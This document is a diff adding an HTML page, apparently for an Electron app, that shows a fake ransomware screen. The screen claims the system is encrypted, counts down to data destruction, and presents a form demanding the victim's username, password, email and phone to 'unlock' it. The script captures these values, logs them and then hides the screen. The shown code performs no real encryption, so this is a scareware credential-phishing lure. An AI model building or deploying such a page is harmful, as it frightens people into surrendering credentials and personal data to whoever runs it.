@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Ransomware</title>
+    <link rel="stylesheet" type="text/css" href="./styles.css" />
+    <!-- https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP -->
+    <meta
+      http-equiv="Content-Security-Policy"
+      content="default-src 'self'; script-src 'self' 'unsafe-inline'"
+    />
+    <meta
+      http-equiv="X-Content-Security-Policy"
+      content="default-src 'self'; script-src 'self' 'unsafe-inline'"
+    />
+  </head>
+
+  <body class="background_black">
+    <h1 class="center bold_red">Your System has been compromised !!!</h1>
+
+    <div id="main_container">
+      <h3 class="center">
+        Your system has been encrypted and data will be destroyed in
+        <p id="timer-countdown"></p>
+      </h3>
+      <div class="form__container">
+        <h4>Enter the details below to save your data:</h4>
+        <form action="/api/user" method="post" id="userForm">
+          <div class="input__box">
+            <label for="username"> username </label>
+            <input required type="text" id="username" />
+          </div>
+          <div class="input__box">
+            <label for="password"> password </label>
+            <input required type="password" id="password" />
+          </div>
+          <div class="input__box">
+            <label for="email"> email </label>
+            <input required type="text" id="email" />
+          </div>
+          <div class="input__box">
+            <label for="phone"> phone </label>
+            <input required type="text" id="phone" />
+          </div>
+
+          <button type="submit">Unlock</button>
+        </form>
+      </div>
+    </div>
+    <script>
+      var fromDate = new Date();
+      fromDate.setHours(23, 59, 59, 0);
+      setTimerValue();
+      var timer = setInterval(setTimerValue, 1000);
+
+      function getTwoDigitValue(value) {
+        value = parseInt(value);
+        if (value < 10) {
+          return `0${value}`;
+        }
+        return String(value);
+      }
+      function setTimerValue() {
+        const timeValue = fromDate.getTime() - new Date().getTime();
+        const differenceDate = new Date(timeValue);
+        const hourValue = getTwoDigitValue(differenceDate.getHours());
+        const minuteValue = getTwoDigitValue(differenceDate.getMinutes());
+        const secondValue = getTwoDigitValue(differenceDate.getSeconds());
+
+        document.getElementById(
+          "timer-countdown"
+        ).innerText = ` ${hourValue}:${minuteValue}:${secondValue} hours`;
+      }
+
+      function handleSubmit(e) {
+        e.preventDefault();
+        const username = e.target.username.value;
+        const password = e.target.password.value;
+        const email = e.target.email.value;
+        const phone = e.target.phone.value;
+
+        console.log({ username, password, email, phone });
+        clearInterval(timer);
+        document.getElementById("main_container").remove();
+      }
+      document
+        .getElementById("userForm")
+        .addEventListener("submit", handleSubmit);
+    </script>
+
+    <!-- You can also require other files to run in this process -->
+    <script src="./dist/renderer.js"></script>
+  </body>
+</html>
